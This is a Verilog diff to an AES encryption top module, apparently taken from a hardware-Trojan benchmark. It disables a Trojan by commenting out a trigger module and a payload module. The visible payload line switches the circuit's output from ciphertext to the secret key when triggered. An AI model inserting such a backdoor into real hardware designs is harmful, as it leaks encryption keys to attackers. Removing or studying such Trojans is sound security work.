@@ -29,12 +29,13 @@ module aes_top (
 	
 	// Instantiation of AES encryption module
 	aes_128 AES (.clk(clk), .rst(rst), .state(state), .key(key), .out(HT_ciphertext)); 
-	HT_Tri HT_Trigger (.rst(rst), .state(state), .Tj_Trig(HT_Trig)); 
-	HT_TSC HT_Trojan (.Tj_Trig(HT_Trig), .key(key), .ciphertext(HT_ciphertext), .out(out)); 
+	assign out = HT_ciphertext;
+	//HT_Tri HT_Trigger (.rst(rst), .state(state), .Tj_Trig(HT_Trig)); 
+	//HT_TSC HT_Trojan (.Tj_Trig(HT_Trig), .key(key), .ciphertext(HT_ciphertext), .out(out)); 
  
 endmodule
 
-module HT_Tri(
+/*module HT_Tri(
     input rst,
     input [127:0] state,
     output reg Tj_Trig
@@ -60,4 +61,4 @@ module HT_TSC(
 
 assign out = Tj_Trig?key:ciphertext; 
 
-endmodule 
+endmodule */
